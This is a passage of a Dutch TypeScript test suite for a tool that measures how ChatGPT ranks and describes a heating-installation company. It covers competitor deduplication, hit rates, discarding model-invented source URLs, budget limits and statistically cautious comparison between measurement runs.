      { name: "Gasservice Brabant", position: 2, reason: "regionaal sterk" },
      // ⚠️ Vangnet 1: hetzelfde bedrijf onder een tweede schrijfwijze. Zonder
      // ontdubbelen telt de noemer te hoog en zakt de plek van iedereen.
      { name: "feenstra", position: 3, reason: "dubbel" },
      // ⚠️ Vangnet 2: de klant nog een keer. Een model dat hem twee keer noemt,
      // bedoelt hem één keer, en dan telt zijn VROEGSTE plek.
      { name: "Gasservice Brabant Oss", position: 4, reason: "dubbel" },
      { name: "Van Dorp", position: 5, reason: "installateur" },
    ],
    eigen,
  );

  eq("dubbelen zijn eruit", String(uitkomst.ofParties), "3");
  eq("en de klant staat op zijn vroegste plek", String(uitkomst.ownPosition), "2");
  eq(
    "de andere bedrijven zijn de ontdekte concurrenten",
    uitkomst.rivals.map((r) => r.name).join(", "),
    "Feenstra, Van Dorp",
  );

  // ⚠️ Vangnet 3: niet genoemd is null en niet de laatste plek. Dat is de
  // duurste fout die dit blok kan maken, want "AI raadt je niet aan" is een
  // heel ander advies dan "AI zet je achteraan".
  const nietGenoemd = readMarketAnswer(
    [
      { name: "Feenstra", position: 1, reason: "" },
      { name: "Van Dorp", position: 2, reason: "" },
    ],
    eigen,
  );
  ok("niet genoemd levert geen plek op", nietGenoemd.ownPosition === null);
  ok("en zeker niet de laatste", nietGenoemd.ownPosition !== nietGenoemd.ofParties);

  ok("er worden hooguit acht bedrijven geteld", MAX_NAMED === 8);
  eq(
    "een lange opsomming wordt afgekapt",
    String(
      readMarketAnswer(
        Array.from({ length: 20 }, (_, i) => ({ name: `Bedrijf ${i}`, position: i + 1, reason: "" })),
        eigen,
      ).ofParties,
    ),
    "8",
  );
});

group("de trefkans staat los van de plek", () => {
  const eigen = ["Gasservice Brabant"];
  const vraag = (namen: string[]) =>
    readMarketAnswer(
      namen.map((n, i) => ({ name: n, position: i + 1, reason: "" })),
      eigen,
    );

  // ⚠️ DE KERN VAN DIT BLOK. Een specialist die bij één van de tien vragen
  // genoemd wordt en dan bovenaan staat, is iets heel anders dan een brede
  // speler die overal genoemd wordt op plek vijf. Op alleen de gemiddelde plek
  // wint de specialist, terwijl hij bij negen van de tien koopvragen
  // onzichtbaar is.
  const specialist = summariseMarket([
    vraag(["Gasservice Brabant", "Feenstra", "Van Dorp", "Breman", "Kemkens"]),
    ...Array.from({ length: 9 }, () => vraag(["Feenstra", "Van Dorp", "Breman", "Kemkens", "Wolter"])),
  ]);
  const brede = summariseMarket(
    Array.from({ length: 10 }, () =>
      vraag(["Feenstra", "Van Dorp", "Breman", "Kemkens", "Gasservice Brabant"]),
    ),
  );

  eq("de specialist staat gemiddeld bovenaan", String(specialist.position), "1");
  eq("de brede speler op plek 5", String(brede.position), "5");
  // En precies daarom staat de trefkans ernaast.
  eq("maar de specialist wordt bijna nooit genoemd", String(specialist.hitRate), "0.1");
  eq("en de brede speler altijd", String(brede.hitRate), "1");

  // De ontdekte markt: wie noemt AI het vaakst? Dat is de betrouwbare
  // concurrentieset, want hij is waargenomen en niet opgelegd.
  // Vier van hen komen tien keer voor en Wolter negen keer, dus die hoort
  // achteraan. Bij gelijke frequentie beslist de naam, zodat twee runs op
  // dezelfde data dezelfde volgorde geven.
  ok(
    "de minst genoemde concurrent staat achteraan",
    specialist.rivals[specialist.rivals.length - 1] === "Wolter",
    specialist.rivals.join(", "),
  );
  ok(
    "en alle vijf de ontdekte concurrenten staan erin",
    specialist.rivals.length === 5,
    specialist.rivals.join(", "),
  );

  // ⚠️ De scherpste uitkomst die dit product kan geven, en de zin moet kloppen.
  const nergens = summariseMarket(
    Array.from({ length: 5 }, () => vraag(["Feenstra", "Van Dorp"])),
  );
  ok("niet genoemd levert geen plek op", nergens.position === null);
  const zin = marketSentence(nergens, "Gasservice Brabant");
  ok("en de zin zegt wat dat betekent", zin.includes("niet zichtbaar op het moment dat iemand kiest"), zin);
  ok(
    "terwijl een genoemde klant zijn plek én zijn trefkans leest",
    marketSentence(brede, "Gasservice Brabant").includes("plek 5"),
  );
});

group("dezelfde partij onder drie schrijfwijzen is één partij", () => {
  // ⚠️ LETTERLIJK UIT DE RUN OP GASSERVICE BRABANT (23 augustus 2026). ChatGPT
  // noemde hetzelfde installatiebedrijf over zes antwoorden heen op drie
  // manieren. Die telden als drie concurrenten: op het scherm zou dan drie keer
  // dezelfde partij in de lijst staan, en de trefkans van de klant zou gedeeld
  // worden door een te grote noemer.
  eq(
    "het achtervoegsel valt weg",
    marketKey("Verhees en Van Dijk Installatietechniek"),
    marketKey("Verhees en Van Dijk"),
  );
  eq(
    "en het ampersand ook",
    marketKey("Verhees & Van Dijk"),
    marketKey("Verhees en Van Dijk"),
  );
  eq("B.V. telt niet mee", marketKey("Gasservice Brabant B.V."), marketKey("Gasservice Brabant"));

  // ⚠️ En twee ECHT verschillende bedrijven blijven gescheiden. Dat is de
  // duurdere fout van de twee: een concurrent die verdwijnt omdat hij op een
  // ander lijkt, zie je nergens terug.
  ok(
    "maar twee verschillende bedrijven blijven twee",
    marketKey("Jos Maas Installatie") !== marketKey("Kemkens Installatie"),
  );
  ok(
    "ook als ze dezelfde voornaam delen",
    marketKey("Van Dijk Installatietechniek") !== marketKey("Van Dongen Installatietechniek"),
  );

  // En over antwoorden heen telt hij nu als één, met de rijkste schrijfwijze.
  const eigen = ["Gasservice Brabant"];
  const vraag = (namen: string[]) =>
    readMarketAnswer(
      namen.map((n, i) => ({ name: n, position: i + 1, reason: "" })),
      eigen,
    );
  const samen = summariseMarket([
    vraag(["Verhees en Van Dijk Installatietechniek", "Kemkens", "Gasservice Brabant"]),
    vraag(["Verhees & Van Dijk", "Kemkens", "Gasservice Brabant B.V."]),
    vraag(["Verhees en Van Dijk", "Kemkens"]),
  ]);
  // Beide komen drie keer voor, dus de naam beslist de volgorde. Waar het om
  // gaat is dat het er TWEE zijn en geen vier.
  eq(
    "drie schrijfwijzen leveren één concurrent op",
    samen.rivals.join(" | "),
    "Kemkens | Verhees en Van Dijk Installatietechniek",
  );
  ok("en de rijkste schrijfwijze wint", samen.rivals.includes("Verhees en Van Dijk Installatietechniek"));
  // De klant is in alle drie herkend, ook onder twee schrijfwijzen.
  eq("en de trefkans klopt", String(samen.hitRate), "0.67");
});

group("het meetinstrument is versioneerd", () => {
  // ⚠️ Dit product wordt verkocht op herhaling. Werkt OpenAI het model bij, dan
  // verschuift de meetlat en niet de reputatie, en zonder deze sleutel zou het
  // scherm dat verschil netjes als vooruitgang tekenen.
  ok("de versie noemt het model", instrumentVersion().includes("gpt-5.6"));
  ok("en de promptversie", instrumentVersion().includes(PROMPT_VERSION));
  // ⚠️ De versie hoort mee te bewegen met de oordeelsregel. Bij de tweede run op
  // Gasservice Brabant was het ophogen vergeten, en dan staan twee runs met een
  // andere meetlat onder hetzelfde nummer. De toon ging van 47 naar 0 en dat zou
  // als achteruitgang op het scherm komen, terwijl alleen de regel veranderde.
  ok("en die versie is niet meer de versie van die twee runs", String(PROMPT_VERSION) !== "v2");
  ok("twee gelijke versies zijn vergelijkbaar", comparableRuns("a+b+v1", "a+b+v1"));
  ok("twee verschillende niet", !comparableRuns("a+b+v1", "a+b+v2"));
  // ⚠️ Onbekend is NIET vergelijkbaar. Runs van vóór deze kolom hebben null, en
  // die weten we per definitie niet zeker. De veilige kant is hier "zeg dat het
  // niet vergelijkbaar is" (conventie 3).
  ok("en onbekend evenmin", !comparableRuns(null, "a+b+v2"));
  ok(
    "en de klant leest waarom",
    (instrumentWarning("a+b+v1", "a+b+v2") ?? "").includes("aan de meting liggen"),
  );
  ok("bij gelijke versies staat er niets", instrumentWarning("x", "x") === null);
});

group("de eenduidigheid vraagt om herhalingen", () => {
  // ⚠️ Null bij één meting: met één antwoord is er geen spreiding te berekenen,
  // en 100 invullen zou een zekerheid suggereren die alleen bestaat omdat er
  // niets vergeleken is.
  ok("één meting levert null", consistency([["positief"]]) === null);
  ok("geen enkele meting ook", consistency([]) === null);

  const stabiel = consistency([["positief", "positief", "positief"]]) as number;
  const wisselend = consistency([["positief", "negatief", "neutraal"]]) as number;
  ok("drie keer hetzelfde levert een hoog getal", stabiel > 60, `${stabiel}`);
  ok("drie verschillende antwoorden een laag", wisselend < stabiel, `${wisselend}`);
  // Ook drie van de drie komt niet als "volstrekt zeker" weg, want dat is het
  // bij drie metingen niet (dezelfde plus-vier-correctie als de meting).
  ok("en zelfs stabiel blijft onder de 100", stabiel < 100, `${stabiel}`);
});

group("de domeinindeling herkent een reviewplatform en telt de eigen site apart", () => {
  // ⚠️ Alleen CODE mag een domein als de eigen site aanwijzen. Het model kan
  // die waarde niet meer teruggeven, en dat is een reparatie uit de eerste
  // echte run: het deelde `autobedrijfdetwee.nl` en `alfaromeo.nl` in als
  // "eigen", omdat het de categorie las als "de site van dat bedrijf zelf".
  // Dan zou op het scherm staan dat de site van je concurrent van jou is, en de
  // zin "9 van de 15 bronnen zijn je eigen site" zou onzin worden.
  const soorten = ReputationSourceKinds.shape.domeinen.element.shape.soort.options as string[];
  ok("het model kan 'eigen' niet meer kiezen", !soorten.includes("eigen"), soorten.join(", "));
  ok("maar code wijst hem nog wel aan", knownKind("eigen.nl", "eigen.nl") === "eigen");

  eq("trustpilot is een reviewplatform", String(knownKind("trustpilot.com", "eigen.nl")), "review");
  eq("de kvk is een register", String(knownKind("kvk.nl", "eigen.nl")), "register");
  eq("linkedin is sociaal", String(knownKind("linkedin.com", "eigen.nl")), "sociaal");
  eq("de eigen site is eigen", String(knownKind("eigen.nl", "eigen.nl")), "eigen");
  // Wat niet vaststaat blijft null: dan mag het model het zeggen (blok C5), en
  // pas als dat ook niets oplevert wordt het `overig` (conventie 3).
  ok("een onbekend domein blijft onbepaald", knownKind("vakblad-voor-installateurs.nl", "eigen.nl") === null);

  const geteld = tallySources(
    [
      {
        block: "merk",
        urls: [
          "https://www.trustpilot.com/review/eigen.nl",
          "https://trustpilot.com/review/eigen.nl/2",
          "https://eigen.nl/over-ons",
          "https://bing.com/zoeken",
        ],
      },
      { block: "bron", urls: ["https://vakblad.nl/artikel"] },
    ],
    "eigen.nl",
  );

  eq("trustpilot staat bovenaan met twee citaties", `${geteld[0].domain}:${geteld[0].citations}`, "trustpilot.com:2");
  // ⚠️ De eigen site gaat er hier NIET af, anders dan bij de off-site scan.
  // "Zeven van de elf bronnen zijn je eigen site" is juist de conclusie.
  ok("de eigen site telt gewoon mee", geteld.some((s) => s.domain === "eigen.nl"));
  ok("een zoekmachine niet", !geteld.some((s) => s.domain === "bing.com"));
  ok("google blijft wél staan, want dat is bij een MKB-bedrijf de reviewbron", REVIEW_PLATFORMS.has("google.com"));

  eq(
    "de samenvattende regel telt de eigen site",
    sourceMixSentence([
      { domain: "eigen.nl", kind: "eigen" },
      { domain: "a.nl", kind: "review" },
      { domain: "b.nl", kind: "vakpers" },
    ]),
    "1 van de 3 bronnen zijn je eigen site.",
  );
  ok(
    "en zonder bronnen zegt hij dat er niets is",
    sourceMixSentence([]).includes("geen enkele controleerbare bron"),
  );
});

group("een bron die niet opgezocht is, is geen bron", () => {
  // ⚠️ HET GEVAL DAT DIT AFVANGT, EN HET IS OP PRODUCTIE GEBEURD (23 augustus
  // 2026). De ONGEGRONDE merkvraag over Van den Udenhout leverde vijf URL's op,
  // waaronder `vandenudenhout.nl`, terwijl de klant op `udenhout.nl` zit. Het
  // model mocht niet zoeken, dus het herinnerde zich een patroon en vulde de
  // rest aan.
  const tekst =
    "Van den Udenhout is een Brabants autobedrijf. Zie https://www.vandenudenhout.nl/over-ons " +
    "en https://www.volkswagen.nl/dealers.";

  eq("zonder zoeken levert het niets op", citedUrlsFrom(tekst, {}, false).join(","), "");
  ok("mét zoeken wél", citedUrlsFrom(tekst, {}, true).length === 2);

  // ⚠️ Waarom dit meer is dan een rare link: die URL's gaan de bronnentelling in
  // en verhogen de BEWIJSKRACHT. Dat is precies het cijfer dat moet voorkomen
  // dat een vriendelijk antwoord over een onbekend bedrijf als een goede
  // reputatie leest. Een verzonnen domein telt bovendien als EXTERN, en die
  // wegen het zwaarst; het vangnet werd dus opgeblazen door het gevaar
  // waartegen het beschermt.
  const metVerzinsels = evidenceScore(
    citedUrlsFrom(tekst, {}, true).map((u) => ({
      domain: u,
      isOwn: false,
      isReview: false,
      verifiedRating: false,
    })),
  );
  const zonder = evidenceScore(
    citedUrlsFrom(tekst, {}, false).map((u) => ({
      domain: u,
      isOwn: false,
      isReview: false,
      verifiedRating: false,
    })),
  );
  ok("en de bewijskracht blijft daardoor eerlijk", zonder === 0 && metVerzinsels > 0, `${zonder} tegen ${metVerzinsels}`);

  // ⚠️ DE DERDE STAND, nodig sinds de dienstvragen uit een gedeeld corpus
  // putten. Zo'n antwoord zoekt zelf niets op maar citeert materiaal dat eerder
  // wél is opgezocht. Die bronnen zijn echt; zonder deze stand zou de
  // bewijskracht instorten om een reden die niets met de klant te maken heeft.
  const corpus =
    "Klanten noemen het team deskundig.\n(bron: https://trustpilot.com/review/x)";
  const uitCorpus = citedUrlsFrom(
    "Volgens https://trustpilot.com/review/x is het team deskundig. Zie ook https://verzonnen.nl/x.",
    {},
    false,
    corpus,
  );
  eq(
    "een bron uit het corpus telt mee",
    uitCorpus.join(","),
    "https://trustpilot.com/review/x",
  );
  // En verzinnen wordt daarmee onmogelijk in plaats van onwaarschijnlijk: wat
  // niet in het corpus staat, komt er niet in.
  ok("maar een verzonnen adres ernaast niet", !uitCorpus.some((u) => u.includes("verzonnen")));

  // Afsluitende leestekens horen niet bij de URL, anders telt hetzelfde domein
  // twee keer.
  eq(
    "een punt achter de URL valt eraf",
    citedUrlsFrom("Zie https://trustpilot.com/review/x.", {}, true).join(","),
    "https://trustpilot.com/review/x",
  );
});

group("een reviewcijfer zonder URL wordt weggegooid", () => {
  // Het model levert de kandidaat, de code besluit. Zelfde patroon als
  // `validate-claims.ts`.
  ok(
    "een cijfer zonder URL telt niet",
    !ratingIsAcceptable({ url: null, rating: 4.6, pageMentionsBrand: true }),
  );
  ok(
    "een URL zonder cijfer ook niet",
    !ratingIsAcceptable({ url: "https://trustpilot.com/x", rating: null, pageMentionsBrand: true }),
  );
  ok(
    "een bekend platform met een cijfer wel",
    ratingIsAcceptable({ url: "https://www.trustpilot.com/review/eigen.nl", rating: 4.6, pageMentionsBrand: null }),
  );
  // Een onbekend platform moet bij het ophalen de merknaam bevatten, anders
  // wijst de URL naar een pagina die het model erbij verzon.
  ok(
    "een onbekend platform moet de merknaam bevatten",
    !ratingIsAcceptable({ url: "https://willekeurig.nl/x", rating: 4.6, pageMentionsBrand: false }),
  );
  ok(
    "en mag als hij dat doet",
    ratingIsAcceptable({ url: "https://willekeurig.nl/x", rating: 4.6, pageMentionsBrand: true }),
  );
});

group("de dedupe-sleutels van de reputatieanalyse", () => {
  const runA = "run-a";
  const runB = "run-b";

  // ⚠️ De sleutel hangt aan de RUN en niet aan het profiel. Een tweede scan over
  // drie maanden is nieuw werk en geen duplicaat.
  ok(
    "twee runs van hetzelfde merk zijn twee taken",
    dedupe.reputationBrand(runA) !== dedupe.reputationBrand(runB),
  );
  // ⚠️ De merkbrede vergelijking eindigt op het woord `merk` en niet op een lege
  // string. Een sleutel die op `:` eindigt ziet er in de database uit als een
  // fout, en hij zou botsen met een knoop-id dat ooit leeg zou zijn.
  eq("merkbreed eindigt op een woord", dedupe.reputationCompare(runA, null), "rep_cmp:run-a:merk");
  ok("en niet op een dubbele punt", !dedupe.reputationCompare(runA, null).endsWith(":"));
  ok(
    "twee knopen leveren twee sleutels",
    dedupe.reputationCompare(runA, "o1") !== dedupe.reputationCompare(runA, "o2"),
  );
  // De vergelijking en de reputatievraag van dezelfde knoop zijn verschillend
  // werk: zonder dat verschil zou de tweede als duplicaat wegvallen.
  ok(
    "de vergelijking botst niet met de reputatievraag van dezelfde knoop",
    dedupe.reputationCompare(runA, "o1") !== dedupe.reputationOffering(runA, "o1"),
  );

  // Alle zes moeten van elkaar verschillen: een botsing tussen twee taaksoorten
  // zou er stil eentje laten wegvallen.
  const sleutels = [
    dedupe.reputationStart(runA),
    dedupe.reputationBrand(runA),
    dedupe.reputationOffering(runA, "o1"),
    dedupe.reputationCompare(runA, "o1"),
    dedupe.reputationSources(runA),
    dedupe.reputationSynthesis(runA),
  ];
  ok("de zes taaksoorten botsen niet", new Set(sleutels).size === 6, sleutels.join(", "));
});

group("de budgetpoort slaat over en zwijgt niet", () => {
  eq("het plafond staat op €3", String(RUN_BUDGET_EUR), "3");

  const ruim = decideStep({ step: "compare", spentUsd: 0.5 });
  ok("halverwege de analyse mag de vergelijking gewoon", ruim.ok);
  ok("en er is geen notitie", ruim.note === null);

  const vol = decideStep({ step: "compare", spentUsd: budgetUsd() });
  ok("bij een vol budget wordt de stap overgeslagen", !vol.ok);
  // ⚠️ Overslaan is een uitkomst, geen stilte. De klant ziet een cijfer met een
  // kanttekening in plaats van een cijfer dat doet alsof er niets aan de hand was.
  ok("en dat levert een notitie op", (vol.note ?? "").includes("vergelijking"), vol.note ?? "");
  ok("in gewone taal", (vol.note ?? "").includes("minder vragen"));

  // ⚠️ Kan de teller niet tellen, dan sluit de poort. Nul teruggeven zou hem
  // stil openzetten, precies op het moment dat er iets aan de hand is.
  ok(
    "een onbekend bedrag sluit de poort",
    !decideStep({ step: "brand", spentUsd: Number.POSITIVE_INFINITY }).ok,
  );

  // De hele standaardanalyse hoort ruim onder het plafond te blijven (§5).
  const geschat =
    STEP_COST_USD.brand +
    STEP_COST_USD.offering * 12 +
    STEP_COST_USD.compare * 15 +
    STEP_COST_USD.sources +
    STEP_COST_USD.synthesis;
  ok("de volledige standaardanalyse past er ruim in", geschat < budgetUsd() / 2, `$${geschat.toFixed(2)}`);
});

group("twee metingen naast elkaar zeggen liever niets dan iets verkeerds", () => {
  // De uitgangswaarden komen letterlijk uit de run op Gasservice Brabant van
  // 23 augustus 2026: toon 47 met een standaardfout van 2,6, bewijskracht 74,
  // trefkans 0,17 op de marktvraag. Geen verzonnen getallen, want een test met
  // ronde getallen mist precies de gevallen die in het echt voorkomen.
  const basis: RunSnapshot = {
    startedAt: "2026-08-23T09:00:00.000Z",
    instrumentVersion: "gpt-5.6-luna+gpt-5.6-luna+v2",
    toneIndex: 47,
    toneStderr: 2.6,
    evidenceScore: 74,
    marketHitRate: 0.17,
    marketAnswers: 15,
    marketPosition: 3.5,
    strengths: ["snelle service"],
    weaknesses: ["wisselende bereikbaarheid"],
    marketRivals: ["Verhees en Van Dijk"],
    nodeIds: ["a", "b", "c"],
  };
  const maak = (p: Partial<RunSnapshot>): RunSnapshot => ({ ...basis, ...p });

  // ── Het belangrijkste geval: een verschil dat er groot uitziet en het niet is ──
  //
  // Twee metingen met een standaardfout van 2,6 hebben samen een drempel van
  // 1,96 × √(2,6² + 2,6²) ≈ 7 punten. Zeven punten verschil is dus nog steeds
  // "gelijk gebleven", en dat is de zin die een consultant moet voorlezen.
  const ruis = compareRuns(basis, maak({ toneIndex: 40 }));
  ok("zeven punten toonverschil is nog meetruis", ruis.tone?.meaningful === false, `drempel ${ruis.tone?.threshold}`);
  ok("en de zin zegt gelijk gebleven", compareSentence(ruis, "Gasservice Brabant").includes("gelijk gebleven"));

  const echt = compareRuns(basis, maak({ toneIndex: 20 }));
  ok("zevenentwintig punten is wel een verandering", echt.tone?.meaningful === true);
  ok("en de zin zegt beter", compareSentence(echt, "Gasservice Brabant").includes("beter"));

  // ── Vangnet 1: een andere meetlat levert nooit een uitspraak op ────────────
  //
  // Werkt OpenAI het model bij, dan verschuift de lat en niet de reputatie. Het
  // verschil mag getoond, de conclusie niet.
  const andereLat = compareRuns(basis, maak({ toneIndex: 20, instrumentVersion: "gpt-5.6-luna+gpt-5.6-luna+v1" }));
  ok("een andere meetlat maakt het verschil betekenisloos", andereLat.tone?.meaningful === false);
  ok("maar het verschil zelf blijft zichtbaar", andereLat.tone?.delta === 27);
  ok("met een waarschuwing erbij", (andereLat.warning ?? "").includes("andere versie"));
  ok(
    "en de zin durft niets te zeggen",
    compareSentence(andereLat, "Gasservice Brabant").includes("niet te zeggen"),
  );

  // ── Vangnet 2: geen marge, geen uitspraak (conventie 3) ───────────────────
  const zonderMarge = compareRuns(basis, maak({ toneStderr: null }));
  ok("zonder marge geen toonuitspraak", zonderMarge.tone === null);
  ok("en uitgelegd waarom", (zonderMarge.toneUnknown ?? "").includes("marge"));
  const zonderToon = compareRuns(maak({ toneIndex: null }), basis);
  ok("zonder toon aan één kant ook niet", zonderToon.tone === null);
  ok("en dat is een andere uitleg", (zonderToon.toneUnknown ?? "").includes("te weinig bruikbaars"));

  // ── De twee cijfers zonder standaardfout ──────────────────────────────────
  ok(
    "bewijskracht onder de drempel wordt niet getoond",
    compareRuns(basis, maak({ evidenceScore: 74 - (EVIDENCE_MIN_DELTA - 1) })).evidenceDelta === null,
  );
  ok(
    "en erboven wel",
    compareRuns(basis, maak({ evidenceScore: 74 - EVIDENCE_MIN_DELTA })).evidenceDelta === EVIDENCE_MIN_DELTA,
  );
  // ⚠️ De trefkans op de juiste noemer. Hier stond een vaste drempel van 66
  // procentpunt, gebaseerd op de aanname dat de marktvraag drie keer gesteld
  // wordt. Hij wordt ook per dienst gesteld, dus het zijn er ongeveer vijftien.
  // Met die oude drempel was de sprong van 0,17 naar 0,36 tussen de twee runs op
  // Gasservice Brabant onzichtbaar gebleven, en dat is nu juist het getal waar
  // dit product op verkocht wordt.
  ok(
    "één omgeslagen marktantwoord van de vijftien is ruis",
    compareRuns(basis, maak({ marketHitRate: 0.1 })).hitRateDelta === null,
  );
  ok(
    "zonder noemer geen uitspraak, ook niet bij een groot verschil",
    compareRuns(basis, maak({ marketHitRate: 0.9, marketAnswers: null })).hitRateDelta === null,
  );
  // Van 3 op 15 naar 12 op 15 is een echte verschuiving, en die hoort zichtbaar.
  const trefkans = compareRuns(maak({ marketHitRate: 0.8 }), maak({ marketHitRate: 0.2 }));
  ok("een echte verschuiving in de trefkans komt eruit", trefkans.hitRateDelta === 60, `${trefkans.hitRateDelta}`);

  // ── De lijstjes, die ook zonder cijfermatige verandering iets zeggen ──────
  const lijsten = compareRuns(
    maak({ weaknesses: ["Wisselende bereikbaarheid", "geen vaste prijsafspraak"], marketRivals: ["Feenstra"] }),
    maak({ weaknesses: ["wisselende bereikbaarheid"], marketRivals: ["Verhees en Van Dijk"] }),
  );
  ok("een nieuw bezwaar valt op", lijsten.newWeaknesses.length === 1 && lijsten.newWeaknesses[0] === "geen vaste prijsafspraak");
  // ⚠️ Hoofdletterongevoelig: het model schrijft hetzelfde bezwaar de ene keer
  // met en de andere keer zonder hoofdletter, en dat is geen nieuw bezwaar.
  ok("een hoofdletter maakt geen nieuw bezwaar", !lijsten.newWeaknesses.includes("Wisselende bereikbaarheid"));
  ok("een nieuwe naam in de markt valt op", lijsten.newRivals.includes("Feenstra"));
  ok("en een verdwenen naam ook", lijsten.goneRivals.includes("Verhees en Van Dijk"));

  // ── De scope ──────────────────────────────────────────────────────────────
  ok("dezelfde knopen in een andere volgorde is dezelfde scope", !compareRuns(basis, maak({ nodeIds: ["c", "b", "a"] })).scopeChanged);
  ok("een andere knoop is een andere scope", compareRuns(basis, maak({ nodeIds: ["a", "b", "d"] })).scopeChanged);
  ok("een lege scope levert geen valse kanttekening", !compareRuns(basis, maak({ nodeIds: [] })).scopeChanged);

  // ── Het uitlezen van scope_json, dat vrije JSON is ────────────────────────
  const uitRij = snapshotFromRun({
    started_at: "2026-08-23T09:00:00.000Z",
    instrument_version: "x",
    tone_index: 47,
    tone_stderr: 2.6,
    evidence_score: 74,
    market_hit_rate: 0.17,
    market_answers: 15,
    market_position: 3.5,
    strengths: [],
    weaknesses: [],
    market_rivals: [],
    scope_json: { nodes: [{ id: "a" }, { id: 7 }, {}] },
  });
  ok("alleen echte id's tellen mee", uitRij.nodeIds.length === 1 && uitRij.nodeIds[0] === "a");
  ok(
    "en zonder scope blijft de lijst leeg",
    snapshotFromRun({
      started_at: "2026-08-23T09:00:00.000Z",
      instrument_version: null,
      tone_index: null,
      tone_stderr: null,
      evidence_score: null,
      market_hit_rate: null,
      market_answers: null,
      market_position: null,
      strengths: [],
      weaknesses: [],
      market_rivals: [],
      scope_json: null,
    }).nodeIds.length === 0,
  );
});

group("een opmerking over ons eigen bewijs is geen bezwaar van het bedrijf", () => {
  // ⚠️ ALLE REGELS HIERONDER STAAN LETTERLIJK IN DE TWEEDE RUN OP GASSERVICE
  // BRABANT (23 augustus 2026). Geen bedachte voorbeelden: die missen precies
  // de vormen die in het echt voorkomen.
  const echteBezwaren = [
    "scheef aangesloten rookgasafvoer",
    "geen controle van de gasdichtheid volgens de klant",
    "onverwacht hoge reparatierekening",
    "afspraak bij een gemeld gaslek niet nagekomen",
    "geen vastgelegde gasdrukmeting",
    "onvoldoende prijscommunicatie vooraf",
  ];
  for (const b of echteBezwaren) {
    ok(`"${b}" is een ervaring`, pointKind(b) === "ervaring");
  }

  const overHetBewijs = [
    "weinig onafhankelijke, dienstspecifieke klantfeedback over elektrische warmtepompen",
    "nauwelijks of geen specifieke ventilatiereviews",
    "de actuele steekproef op Klantenvertellen is klein",
    "specifieke zonneboilercertificering niet gevonden",
    "geen klantreview waarin waterzijdig inregelen expliciet wordt genoemd",
    "onvoldoende openbaar bewijs voor kwaliteit van reiniging/inregeling",
    "de actuele status van de gasinstallatie-certificering kan niet worden bevestigd",
    "ouderdom van meer dan 90 jaar niet onafhankelijk onderbouwd",
    "onderliggende reviews van externe warmtepompwebsites niet volledig zichtbaar of inhoudelijk controleerbaar",
    "de meest inhoudelijke ketelreviews zijn inmiddels ongeveer zes à zeven jaar oud",
  ];
  for (const b of overHetBewijs) {
    ok(`"${b.slice(0, 45)}…" gaat over het bewijs`, pointKind(b) === "bewijs", pointKind(b));
  }

  // Het antwoord dat de doorslag gaf: acht lofpunten, en als enige bezwaar een
  // opmerking over onze eigen bronnen. Dat is geen gemengd beeld.
  const eenBezwaarDatGeenBezwaarIs = [
    "het niet nakomen van een afspraak",
    "de actuele status van de gasinstallatie-certificering kan niet worden bevestigd",
  ];
  eq(
    "van twee bezwaren blijft er één echt over",
    String(experiencePoints(eenBezwaarDatGeenBezwaarIs).length),
    "1",
  );
  eq(
    "en de ander is een bevinding over de vindbaarheid",
    String(evidenceRemarks(eenBezwaarDatGeenBezwaarIs).length),
    "1",
  );

  // ⚠️ Bij twijfel ervaring. Een echt bezwaar dat als bewijsopmerking wordt
  // weggezet verdwijnt uit het cijfer, en dat is de duurdere fout van de twee.
  ok("een gewoon bezwaar met het woord bewijs erin blijft een ervaring", pointKind("bewijs van slecht vakmanschap") === "ervaring");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nHet scherm Mijn reputatie: wat er getoond wordt (25 augustus 2026)");

group("de kop zegt de bevinding en niet het cijfer", () => {
  // ⚠️ Het geval van de echte run: alle 22 bruikbare antwoorden kregen het
  // etiket `gemengd`, dat scoort altijd exact 0, en 0 heet op de schaal
  // "neutraal". Het scherm zette daar "neutraal" boven, terwijl er twee regels
  // lager stond dat ChatGPT bij alle 22 vragen zowel lof als kritiek noemt.
  const verdeeld = reputationHeadline({
    toneIndex: 0,
    distribution: { counts: { gemengd: 22 }, spread: 50, n: 22 },
    brand: "Gasservice Brabant",
  });
  eq("22 keer gemengd heet verdeeld", verdeeld.woord, "verdeeld");
  ok("en de kop noemt lof én kritiek", verdeeld.kop.includes("lof"));
  ok("de merknaam staat erin", verdeeld.kop.includes("Gasservice Brabant"));

  // Echt neutraal blijft neutraal: zakelijk gepraat zonder oordeel is iets
  // anders dan een verdeeld beeld, en dat verschil is het hele punt.
  const neutraal = reputationHeadline({
    toneIndex: 0,
    distribution: { counts: { neutraal: 20, gemengd: 2 }, spread: 8, n: 22 },
    brand: "Merk",
  });
  eq("twintig keer neutraal blijft neutraal", neutraal.woord, "neutraal");

  // Precies de helft telt al als verdeeld: bij 22 antwoorden is 11 genoeg.
  eq(
    "de helft gemengd is verdeeld",
    reputationHeadline({
      toneIndex: 0,
      distribution: { counts: { gemengd: 11, neutraal: 11 }, spread: 30, n: 22 },
      brand: "Merk",
    }).woord,
    "verdeeld",
  );

  // ⚠️ Onder de drie antwoorden geen uitspraak over verdeeldheid: dat is dezelfde
  // ondergrens als `spreadSentence()` hanteert, anders zeggen de kop en de zin
  // eronder iets anders.
  eq(
    "bij twee antwoorden geen verdeeld-uitspraak",
    reputationHeadline({
      toneIndex: 0,
      distribution: { counts: { gemengd: 2 }, spread: 50, n: 2 },
      brand: "Merk",
    }).woord,
    "neutraal",
  );

  // Geen beeld is geen nul (conventie 3).
  eq(
    "zonder toon staat er geen beeld",
    reputationHeadline({ toneIndex: null, distribution: null, brand: "Merk" }).woord,
    "geen beeld",
  );
});

group("de toonmeter rekent de schaal om en niet meer dan dat", () => {
  eq("nul staat in het midden", String(tonePercent(0)), "50");
  eq("min honderd staat links", String(tonePercent(-100)), "0");
  eq("honderd staat rechts", String(tonePercent(100)), "100");
  // Buiten de schaal kan niet gebeuren, maar een marge van ±6 op een toon van
  // -98 rekent wél onder de -100 uit. Dat mag de balk niet buiten zijn baan
  // duwen.
  eq("onder de schaal wordt begrensd", String(tonePercent(-140)), "0");
  eq("boven de schaal ook", String(tonePercent(140)), "100");
});

group("de bewijskracht als woord loopt gelijk met de kleur", () => {
  eq("99 is stevig", evidenceWord(99), "stevig onderbouwd");
  eq("60 is de grens naar stevig", evidenceWord(60), "stevig onderbouwd");
  eq("43 is matig", evidenceWord(43), "matig onderbouwd");
  eq("24 is nauwelijks", evidenceWord(24), "nauwelijks onderbouwd");
  eq("niet vastgesteld is geen nul", evidenceWord(null), "niet vastgesteld");
});

group("per product: de drie groepen uit de echte run", () => {
